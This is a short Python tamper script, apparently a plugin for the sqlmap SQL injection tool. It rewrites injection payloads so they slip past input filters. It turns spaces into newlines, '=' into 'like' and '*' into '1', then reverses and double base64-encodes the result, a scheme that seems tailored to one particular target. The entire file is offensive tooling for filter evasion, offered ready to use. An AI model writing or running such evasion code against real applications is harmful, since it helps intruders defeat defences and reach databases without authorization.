#!/usr/bin/env python
"""
Author:Y4tacker
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY
import base64
__priority__ = PRIORITY.LOW


def tamper(payload, **kwargs):
    payload = space2comment(payload)
    retVal = ""
    if payload:
        retVal = base64.b64encode(payload[::-1].encode('utf-8'))
        retVal = base64.b64encode(retVal[::-1]).decode('utf-8')
    return retVal

def space2comment(payload):
    retVal = payload
    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == "=":
                retVal += chr(0x0a)+'like'+chr(0x0a)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal

